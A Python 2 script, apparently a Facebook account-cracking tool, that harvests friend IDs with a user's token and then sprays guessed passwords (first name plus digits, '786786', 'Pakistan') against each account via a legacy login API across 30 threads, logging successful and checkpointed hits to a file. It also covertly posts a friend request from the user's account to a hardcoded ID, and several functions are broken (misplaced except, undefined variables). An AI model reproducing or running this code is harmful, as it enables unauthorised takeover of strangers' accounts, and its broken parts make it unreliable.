#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """ 

\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  

\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
os.system("toilet -F gay -f lean ..KITTY..")
print "\033[1;97m ==================================================="
print  """\033[1;94m       =======================================
\033[1;95m       Author  \033[1;93m: \033[1;96mB4BY DR4G0N
\033[1;95m       Facebook  \033[1;93m: \033[1;96m Techn0logy By M4RMU
\033[1;95m       Github \033[1;93m: \033[1;96mhttps://Github.com/M4RMU
\033[1;94m       ======================================="""
print " \x1b[1;97m==================================================="

CorrectUsername = "KITTY"
CorrectPassword = "kitty"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')

def main():

    os.system("clear")

    print logo

    print("")
    print("         \033[0;90m( Hacking  Menu )").center(50)
    print("\033[1;97m------------------------------------------")
    print("\033[1;91m(1)\033[1;93m -> \033[1;92mHack Public Acc (Fast)")
    print("\033[1;91m(2)\033[1;93m -> \033[1;92mOwner Info")
    print("\033[1;91m(3)\033[1;93m -> \033[1;92Exit Tool")
    print("\033[1;97m------------------------------------------")
    print("")

    main_select()

def main_select():

    SKB = raw_input("\033[1;92m-> Select \033[1;90m ")

    if SKB =="1":

        login()

    if SKB =="2":

        os.system("xdg-open https://www.facebook.com/sumer.singh.33483903")

	main()

    elif SKB =="0":

        os.system("exit")

    else:

        print("\033[1;91m-> Please select a valid option").center(50)

        time.sleep(2)

        main()

def login():

    os.system("clear")

    print logo
    print("        \033[0;90m( LOGIN MAIN MENU )").center(50)
    print("\033[1;97m---------------------------------------------------")
    print("\033[1;91m(1)\033[1;93m -> \033[1;92mLogin Using Token")
    print("\033[1;91m(2)\033[1;93m -> \033[1;92mLogin Using ID & Password")
    print("\033[1;91m(3)\033[1;93m -> \033[1;92mMain menu back")
    print ("\033[1;97m--------------------------------------------------")
    print("")

    login_select()

def login_select():

    SKB = raw_input(" \033[1;93mOption -> \033[1;90m ")

    if SKB =="1":

        os.system("clear")

        print logo

        print("")

	print("\033[1;92m( Login With Token )").center(50)

	print("")

        token = raw_input("\033[1;93m-> \033[1;92mPaste Token Here \033[0;90m")

        token_s = open(".fb_token.txt","w")

        token_s.write(token)

        token_s.close()

        try:

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

            q = json.loads(r.text)

            name = q["name"]

            nm = name.rsplit(" ")[0]

            print("")

            print("\033[1;92mYour Token Login Successfully").center(50)

            time.sleep(1)

	    os.system("xdg-open https://www.facebook.com/sumer.singh.33483903")


	    time.sleep(1)

            menu()

        except (KeyError , IOError):

            print("")

            print("\033[1;91mToken invalid or Account lock\033[0;93m").center(50)

            print("")

            time.sleep(2)

            login()

    elif SKB =="2":

        login_fb()

    elif SKB =="3":

        main()

    else:

        print("")

        print("\033[1;91mSelect a valid option").center(50)

        print("")

        login_select()

def login_fb():
        global token
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
	try:
		br.open('https://m.facebook.com')
		except mechanize.URLError:
		print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
				os.system('xdg-open https://www.Facebook.com/Omi6t')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
        global token
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except (KeyError , IOError):
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()

	try:
	
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()

     	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	pilih_super()

def pilih_super():
	xin = raw_input("\n\033[1;97m >>> \033[1;97m")
	if xin =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif xin =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif xin =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif xin =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1122'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
